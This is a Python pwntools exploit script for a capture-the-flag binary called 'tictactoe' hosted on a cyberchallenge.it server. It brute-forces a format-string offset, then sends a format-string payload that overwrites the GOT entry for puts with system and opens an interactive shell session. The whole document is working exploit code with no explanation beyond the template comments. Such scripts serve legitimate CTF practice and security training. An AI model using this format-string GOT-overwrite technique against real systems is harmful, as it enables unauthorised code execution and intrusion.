#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./tictactoe --host tictactoe.challs.cyberchallenge.it --port 9132
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './tictactoe')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'tictactoe.challs.cyberchallenge.it'
port = int(args.PORT or 9132)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
set follow-fork-mode parent
b *0x8048ad8
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

offset = 15
find_offset = False
if find_offset:
    for i in range(1, 20):
        payload = b'ABCD%' + str(i).encode() + b'$p'
        io.sendlineafter(b'move: ', payload)
        ret = io.recvline().decode()
        if '44434241' in ret:
            print('Offset: ', i)
            exit(0)

payload = fmtstr_payload(offset, {exe.got['puts']: exe.symbols['system']})
io.sendlineafter(b'move: ', payload)

io.interactive()

